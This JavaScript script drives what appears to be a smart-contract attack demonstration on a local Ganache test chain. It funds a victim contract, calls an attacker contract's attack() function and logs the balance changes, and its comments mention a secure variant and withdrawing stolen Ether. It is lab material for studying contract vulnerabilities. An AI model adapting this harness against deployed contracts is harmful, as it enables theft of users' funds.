const { Web3 } = require('web3'); //Import web3 library

//connection to Ganache
const web3 = new Web3('http://localhost:7545'); 

//getting artifacts (ABI, bytecode, etc,.)
const MyContractArtifact = require('../build/contracts/MyContract.json');
//const MyContractSecureArtifact = require('../build/contracts/MyContractSecure.json');
const MyAttackerArtifact = require('../build/contracts/MyAttacker.json');

//running attack
async function run() {
  const accounts = await web3.eth.getAccounts(); //get accounts
  const victimAddress = '0xA2C7516006DC96C25AB3c350A79c06a669056955';
  const attackerAddress = '0xAd7C41801A4f8F1871bABb0bECf485c727a4c5ed';

  //creating instances with the used of the ABIs
  const victim = new web3.eth.Contract(MyContractArtifact.abi, victimAddress);
  //const victim = new web3.eth.Contract(MyContractSecureArtifact.abi, victimAddress);
  const attacker = new web3.eth.Contract(MyAttackerArtifact.abi, attackerAddress);

  await victim.methods.deposit().send({ from: accounts[0], value: web3.utils.toWei("5", "ether") }); //depositing 5 Ether from account 1
  await victim.methods.deposit().send({ from: accounts[1], value: web3.utils.toWei("5", "ether") }); //depositing 5 Ether from account 2
  web3.eth.defaultAccount = accounts[2];
  
  //constants for getting current address balances
  const victimBalanceBeforeAttack = await web3.eth.getBalance(victimAddress);
  const attackerBalanceBeforeAttack = await web3.eth.getBalance(attackerAddress);

  console.log("Victim Balance Before Attack (Ether):", web3.utils.fromWei(victimBalanceBeforeAttack, 'ether'));
  console.log("Attacker Balance Before Attack (Ether):", web3.utils.fromWei(attackerBalanceBeforeAttack, 'ether'));

  await attacker.methods.attack().send({ from: accounts[2], value: web3.utils.toWei("1", "ether"), gas: 3000000 }); //attack function to run attack from account 3 with 1 Ether
  //await attacker.methods.withdraw().send({ from: accounts[2] }); // account withdrawing stolen ETH
  console.log("Victim Balance After Attack (Ether):", web3.utils.fromWei(await web3.eth.getBalance(victimAddress), 'ether'));
  console.log("Attacker Balance After Attack (Ether):", web3.utils.fromWei(await web3.eth.getBalance(attackerAddress), 'ether'));
}
run();
